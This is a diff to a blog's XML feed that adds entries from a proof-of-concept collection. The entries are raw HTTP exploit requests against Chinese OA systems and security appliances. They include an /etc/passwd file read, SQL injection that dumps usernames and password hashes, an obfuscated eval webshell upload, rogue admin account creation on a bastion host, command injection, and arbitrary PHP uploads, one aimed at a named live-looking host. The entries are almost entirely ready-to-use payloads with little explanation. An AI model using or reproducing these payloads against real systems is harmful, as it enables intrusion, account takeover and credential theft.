@@ -4,6 +4,168 @@
   
   
   <entry>
+    <title>蓝凌OA前台RCE</title>
+    <link href="/2023/08/11/%E8%93%9D%E5%87%8COA%E5%89%8D%E5%8F%B0RCE/"/>
+    <url>/2023/08/11/%E8%93%9D%E5%87%8COA%E5%89%8D%E5%8F%B0RCE/</url>
+    
+    <content type="html"><![CDATA[<h3 id="蓝凌OA前台任意代码执行漏洞"><a href="#蓝凌OA前台任意代码执行漏洞" class="headerlink" title="蓝凌OA前台任意代码执行漏洞"></a>蓝凌OA前台任意代码执行漏洞</h3><h4 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h4><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1Host: www.ynjd.cn:801User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)Accept: */*Connection: Keep-AliveContent-Length: 42Content-Type: application/x-www-form-urlencodedvar=&#123;&quot;body&quot;:&#123;&quot;file&quot;:&quot;file:///etc/passwd&quot;&#125;&#125;<br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+    <categories>
+      
+      <category>POC收集</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>POC</tag>
+      
+      <tag>蓝凌OA</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>广联达OA_SQL注入漏洞</title>
+    <link href="/2023/08/11/%E5%B9%BF%E8%81%94%E8%BE%BEOA-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
+    <url>/2023/08/11/%E5%B9%BF%E8%81%94%E8%BE%BEOA-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
+    
+    <content type="html"><![CDATA[<h3 id="广联达OA-SQL注入漏洞"><a href="#广联达OA-SQL注入漏洞" class="headerlink" title="广联达OA SQL注入漏洞"></a>广联达OA SQL注入漏洞</h3><h4 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h4><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs http">POST /Webservice/IM/Config/ConfigService.asmx/GetIMDictionary HTTP/1.1Host: xxx.comUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36Accept: text/html,application/xhtml xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Referer: http://xxx.com:8888/Services/Identification/Server/Incompatible.aspxAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 88<br>dasdas=&amp;key=1&#x27; UNION ALL SELECT top 1812 concat(F_CODE,&#x27;:&#x27;,F_PWD_MD5) from T_ORG_USER --<br> <br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+    <categories>
+      
+      <category>POC收集</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>POC</tag>
+      
+      <tag>广联达OA</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>广联达OA后台文件上传漏洞</title>
+    <link href="/2023/08/11/%E5%B9%BF%E8%81%94%E8%BE%BEOA%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
+    <url>/2023/08/11/%E5%B9%BF%E8%81%94%E8%BE%BEOA%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
+    
+    <content type="html"><![CDATA[<h3 id="广联达OA-后台文件上传漏洞"><a href="#广联达OA-后台文件上传漏洞" class="headerlink" title="广联达OA 后台文件上传漏洞"></a>广联达OA 后台文件上传漏洞</h3><h4 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h4><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs http">POST /gtp/im/services/group/msgbroadcastuploadfile.aspx HTTP/1.1Host: 10.10.10.1:8888X-Requested-With: Ext.basexAccept: text/html, application/xhtml+xml, image/jxr, */*Accept-Language: zh-Hans-CN,zh-Hans;q=0.5User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36Accept-Encoding: gzip, deflateContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELjAccept: */*Origin: http://10.10.10.1Referer: http://10.10.10.1:8888/Workflow/Workflow.aspx?configID=774d99d7-02bf-42ec-9e27-caeaa699f512&amp;menuitemid=120743&amp;frame=1&amp;modulecode=GTP.Workflow.TaskCenterModule&amp;tabID=40Cookie: Connection: closeContent-Length: 421<br>------WebKitFormBoundaryFfJZ4PlAZBixjELjContent-Disposition: form-data; filename=&quot;1.aspx&quot;;filename=&quot;1.jpg&quot;Content-Type: application/text<br>&lt;%@ Page Language=&quot;Jscript&quot; Debug=true%&gt;&lt;%var FRWT=&#x27;XeKBdPAOslypgVhLxcIUNFmStvYbnJGuwEarqkifjTHZQzCoRMWD&#x27;;var GFMA=Request.Form(&quot;qmq1&quot;);var ONOQ=FRWT(19) + FRWT(20) + FRWT(8) + FRWT(6) + FRWT(21) + FRWT(1);eval(GFMA, ONOQ);%&gt;<br>------WebKitFormBoundaryFfJZ4PlAZBixjELj--<br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+    <categories>
+      
+      <category>POC收集</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>POC</tag>
+      
+      <tag>广联达OA</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>安恒设备漏洞</title>
+    <link href="/2023/08/11/%E5%AE%89%E6%81%92%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/"/>
+    <url>/2023/08/11/%E5%AE%89%E6%81%92%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/</url>
+    
+    <content type="html"><![CDATA[<h3 id="明御运维审计与风险控制系统堡垒机任意用户注册"><a href="#明御运维审计与风险控制系统堡垒机任意用户注册" class="headerlink" title="明御运维审计与风险控制系统堡垒机任意用户注册"></a>明御运维审计与风险控制系统堡垒机任意用户注册</h3><h4 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h4><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http">POST /service/?unix:/../../../../var/run/rpc/xmlrpc.sock|http://test/wsrpc HTTP/1.1Host: xxxCookie: LANG=zh;USM=0a0e1f29d69f4b9185430328b44ad990832935dbf1b90b8769d297dd9f0eb848Cache-Control: max-age=0Sec-Ch-Ua: &quot; Not A;Brand&quot;;v=&quot;99&quot;,&quot;Chromium&quot;;v=&quot;100&quot;, &quot;Google Chrome&quot;;v=&quot;100&quot;Sec-Ch-Ua-Mobile: ?0Sec-Ch-Ua-Platform: &quot;Windows&quot;Upgrade-Insecure-Requests: 1User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,like Gecko) Chrome/100.0.4896.127 Safari/537.36Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Sec-Fetch-Site: noneSec-Fetch-Mode: navigateSec-Fetch-User: ?1Sec-Fetch-Dest: documentAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: closeContent-Length: 1121<br>&lt;?xmlversion=&quot;1.0&quot;?&gt;&lt;methodCall&gt;&lt;methodName&gt;web.user_add&lt;/methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;&lt;array&gt;&lt;data&gt;&lt;value&gt;&lt;string&gt;admin&lt;/string&gt;&lt;/value&gt;&lt;value&gt;&lt;string&gt;5&lt;/string&gt;&lt;/value&gt;&lt;value&gt;&lt;string&gt;XX.XX.XX.XX&lt;/string&gt;&lt;/value&gt;&lt;/data&gt;&lt;/array&gt;&lt;/value&gt;&lt;/param&gt;&lt;param&gt;&lt;value&gt;&lt;struct&gt;&lt;member&gt;&lt;name&gt;uname&lt;/name&gt;&lt;value&gt;&lt;string&gt;deptadmin&lt;/string&gt;&lt;/value&gt;&lt;/member&gt;&lt;member&gt;&lt;name&gt;name&lt;/name&gt;&lt;value&gt;&lt;string&gt;deptadmin&lt;/string&gt;&lt;/value&gt;&lt;/member&gt;&lt;member&gt;&lt;name&gt;pwd&lt;/name&gt;&lt;value&gt;&lt;string&gt;Deptadmin@123&lt;/string&gt;&lt;/value&gt;&lt;/member&gt;&lt;member&gt;&lt;name&gt;authmode&lt;/name&gt;&lt;value&gt;&lt;string&gt;1&lt;/string&gt;&lt;/value&gt;&lt;/member&gt;&lt;member&gt;&lt;name&gt;deptid&lt;/name&gt;&lt;value&gt;&lt;string&gt;&lt;/string&gt;&lt;/value&gt;&lt;/member&gt;&lt;member&gt;&lt;name&gt;email&lt;/name&gt;&lt;value&gt;&lt;string&gt;&lt;/string&gt;&lt;/value&gt;&lt;/member&gt;&lt;member&gt;&lt;name&gt;mobile&lt;/name&gt;&lt;value&gt;&lt;string&gt;&lt;/string&gt;&lt;/value&gt;&lt;/member&gt;&lt;member&gt;&lt;name&gt;comment&lt;/name&gt;&lt;value&gt;&lt;string&gt;&lt;/string&gt;&lt;/value&gt;&lt;/member&gt;&lt;member&gt;&lt;name&gt;roleid&lt;/name&gt;&lt;value&gt;&lt;string&gt;101&lt;/string&gt;&lt;/value&gt;&lt;/member&gt;&lt;/struct&gt;&lt;/value&gt;&lt;/param&gt;&lt;/params&gt;&lt;/methodCall&gt;<br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+    <categories>
+      
+      <category>POC收集</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>POC</tag>
+      
+      <tag>安恒</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>深信服设备漏洞</title>
+    <link href="/2023/08/11/%E6%B7%B1%E4%BF%A1%E6%9C%8D%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/"/>
+    <url>/2023/08/11/%E6%B7%B1%E4%BF%A1%E6%9C%8D%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/</url>
+    
+    <content type="html"><![CDATA[<h3 id="深信服应用交付系统命令执行漏洞"><a href="#深信服应用交付系统命令执行漏洞" class="headerlink" title="深信服应用交付系统命令执行漏洞"></a>深信服应用交付系统命令执行漏洞</h3><h4 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h4><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http">POST /rep/loginHost:10.10.10.1:85<br>clsMode=cls_mode_login%0Als%0A&amp;index=index&amp;log_type=report&amp;loginType=account&amp;page=login&amp;rnd=0&amp;userID=admin&amp;userPsw=123<br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+    <categories>
+      
+      <category>POC收集</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>POC</tag>
+      
+      <tag>深信服</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>网神防火墙漏洞</title>
+    <link href="/2023/08/11/%E7%BD%91%E7%A5%9E%E9%98%B2%E7%81%AB%E5%A2%99%E6%BC%8F%E6%B4%9E/"/>
+    <url>/2023/08/11/%E7%BD%91%E7%A5%9E%E9%98%B2%E7%81%AB%E5%A2%99%E6%BC%8F%E6%B4%9E/</url>
+    
+    <content type="html"><![CDATA[<h3 id="网神SecGate3600防火墙obj-app-upfile任意文件上传漏洞"><a href="#网神SecGate3600防火墙obj-app-upfile任意文件上传漏洞" class="headerlink" title="网神SecGate3600防火墙obj_app_upfile任意文件上传漏洞"></a>网神SecGate3600防火墙obj_app_upfile任意文件上传漏洞</h3><h4 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h4><p>马儿路径：attachements&#x2F;xxx.php</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs http">POST /?g=obj_app_upfile HTTP/1.1Host: x.x.x.xAccept: */*Accept-Encoding: gzip, deflateContent-Length: 574Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJpMyThWnAxbcBBQcUser-Agent: Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0; Trident/4.0)<br>------WebKitFormBoundaryJpMyThWnAxbcBBQcContent-Disposition: form-data; name=&quot;MAX_FILE_SIZE&quot;<br>10000000------WebKitFormBoundaryJpMyThWnAxbcBBQcContent-Disposition: form-data; name=&quot;upfile&quot;; filename=&quot;vulntest.php&quot;Content-Type: text/plain<br>&lt;?php php马?&gt;<br>------WebKitFormBoundaryJpMyThWnAxbcBBQcContent-Disposition: form-data; name=&quot;submit_post&quot;<br>obj_app_upfile------WebKitFormBoundaryJpMyThWnAxbcBBQcContent-Disposition: form-data; name=&quot;__hash__&quot;<br>0b9d6b1ab7479ab69d9f71b05e0e9445------WebKitFormBoundaryJpMyThWnAxbcBBQc--<br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+    <categories>
+      
+      <category>POC收集</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>POC</tag>
+      
+      <tag>网神</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>一次公益src挖掘_2023_8_4</title>
     <link href="/2023/08/10/%E4%B8%80%E6%AC%A1%E5%85%AC%E7%9B%8Asrc%E6%8C%96%E6%8E%98_2023_8_4/"/>
     <url>/2023/08/10/%E4%B8%80%E6%AC%A1%E5%85%AC%E7%9B%8Asrc%E6%8C%96%E6%8E%98_2023_8_4/</url>
@@ -85,11 +247,11 @@
   
   
   <entry>
-    <title>通达OA-CVE-2023-4166</title>
+    <title>通达OA_sql注入漏洞-CVE-2023-4166</title>
     <link href="/2023/08/10/%E9%80%9A%E8%BE%BEOA-CVE-2023-4166/"/>
     <url>/2023/08/10/%E9%80%9A%E8%BE%BEOA-CVE-2023-4166/</url>
     
-    <content type="html"><![CDATA[<h2 id="通达OA（CVE-2023-4166）"><a href="#通达OA（CVE-2023-4166）" class="headerlink" title="通达OA（CVE-2023-4166）"></a>通达OA（CVE-2023-4166）</h2><h3 id="描述-影响范围"><a href="#描述-影响范围" class="headerlink" title="描述-影响范围"></a><strong>描述-影响范围</strong></h3><p>通达OA</p><p>是由北京通达信科科技有限公司自主研发的协同办公自动化软件，是适合各个行业用户的综合管理办公平台</p><p>本次范围：通达OA版本11.10之前</p><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a><strong>POC</strong></h3><p>请求包</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/general/system/seal_manage/dianju/delete_log.php?DELETE_STR=1)%20and%20(substr(DATABASE(),1,1))=char(84)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.232.137:8098<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>PHPSESSID=1u7tsd1cpgp9qvco726smb50h5; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=779f3f46<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br></code></pre></td></tr></table></figure>]]></content>
+    <content type="html"><![CDATA[<h2 id="通达OA-sql注入漏洞（CVE-2023-4166）"><a href="#通达OA-sql注入漏洞（CVE-2023-4166）" class="headerlink" title="通达OA sql注入漏洞（CVE-2023-4166）"></a>通达OA sql注入漏洞（CVE-2023-4166）</h2><h3 id="描述-影响范围"><a href="#描述-影响范围" class="headerlink" title="描述-影响范围"></a><strong>描述-影响范围</strong></h3><p>通达OA</p><p>是由北京通达信科科技有限公司自主研发的协同办公自动化软件，是适合各个行业用户的综合管理办公平台</p><p>本次范围：通达OA版本11.10之前</p><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a><strong>POC</strong></h3><p>请求包</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/general/system/seal_manage/dianju/delete_log.php?DELETE_STR=1)%20and%20(substr(DATABASE(),1,1))=char(84)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.232.137:8098<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>PHPSESSID=1u7tsd1cpgp9qvco726smb50h5; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=779f3f46<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br></code></pre></td></tr></table></figure>]]></content>
     
     
     <categories>
@@ -116,7 +278,7 @@
     <link href="/2023/08/10/%E6%B3%9B%E5%BE%AEOA-Weaver-E-Office9-0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
     <url>/2023/08/10/%E6%B3%9B%E5%BE%AEOA-Weaver-E-Office9-0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
     
-    <content type="html"><![CDATA[<h2 id="泛微-OA-代码执行-EXP"><a href="#泛微-OA-代码执行-EXP" class="headerlink" title="泛微 OA 代码执行 EXP"></a>泛微 OA 代码执行 EXP</h2><h3 id="描述和影响范围"><a href="#描述和影响范围" class="headerlink" title="描述和影响范围"></a><strong>描述和影响范围</strong></h3><p>Weaver E-Office9版本存在代码问题漏洞，该漏洞源于文件&#x2F;inc&#x2F;jquery&#x2F;uploadify&#x2F;uploadify.php存在问题，对参数Filedata的操作会导致不受限制的上传。</p><p>Weaver E-Office9.0</p><h3 id="POC-or-EXP"><a href="#POC-or-EXP" class="headerlink" title="POC or EXP"></a><strong>POC or EXP</strong></h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/inc/jquery/uploadify/uploadify.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.232.137:8082<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>test<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>493<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85<br><br><span class="language-php">--<span class="hljs-number">25</span>d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85</span><br><span class="language-php">Content-Disposition: form-data; name=<span class="hljs-string">&quot;Filedata&quot;</span>; filename=<span class="hljs-string">&quot;666.php&quot;</span></span><br><span class="language-php">Content-Type: application/octet-stream</span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span></span><br><span class="language-php"></span><br><span class="language-php">--<span class="hljs-number">25</span>d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85--</span><br><span class="language-php">--<span class="hljs-number">25</span>d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85</span><br><span class="language-php">Content-Disposition: form-data; name=<span class="hljs-string">&quot;file&quot;</span>; filename=<span class="hljs-string">&quot;&quot;</span></span><br><span class="language-php">Content-Type: application/octet-stream</span><br><span class="language-php"></span><br><span class="language-php">--<span class="hljs-number">25</span>d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85--</span><br></code></pre></td></tr></table></figure>]]></content>
+    <content type="html"><![CDATA[<h2 id="泛微E-Office9文件上传漏洞-CVE-2023-2523"><a href="#泛微E-Office9文件上传漏洞-CVE-2023-2523" class="headerlink" title="泛微E-Office9文件上传漏洞(CVE-2023-2523)"></a>泛微E-Office9文件上传漏洞(CVE-2023-2523)</h2><h3 id="描述和影响范围"><a href="#描述和影响范围" class="headerlink" title="描述和影响范围"></a>描述和影响范围</h3><p>Weaver E-Office9版本存在代码问题漏洞，该漏洞源于文件&#x2F;inc&#x2F;jquery&#x2F;uploadify&#x2F;uploadify.php存在问题，对参数Filedata的操作会导致不受限制的上传</p><p>Weaver E-Office9.0</p><h3 id="POC-or-EXP"><a href="#POC-or-EXP" class="headerlink" title="POC or EXP"></a>POC or EXP</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/inc/jquery/uploadify/uploadify.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.232.137:8082<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>test<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>493<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85<br><br><span class="language-php">--<span class="hljs-number">25</span>d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85</span><br><span class="language-php">Content-Disposition: form-data; name=<span class="hljs-string">&quot;Filedata&quot;</span>; filename=<span class="hljs-string">&quot;666.php&quot;</span></span><br><span class="language-php">Content-Type: application/octet-stream</span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span></span><br><span class="language-php"></span><br><span class="language-php">--<span class="hljs-number">25</span>d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85--</span><br><span class="language-php">--<span class="hljs-number">25</span>d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85</span><br><span class="language-php">Content-Disposition: form-data; name=<span class="hljs-string">&quot;file&quot;</span>; filename=<span class="hljs-string">&quot;&quot;</span></span><br><span class="language-php">Content-Type: application/octet-stream</span><br><span class="language-php"></span><br><span class="language-php">--<span class="hljs-number">25</span>d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85--</span><br></code></pre></td></tr></table></figure>]]></content>
     
     
     <categories>
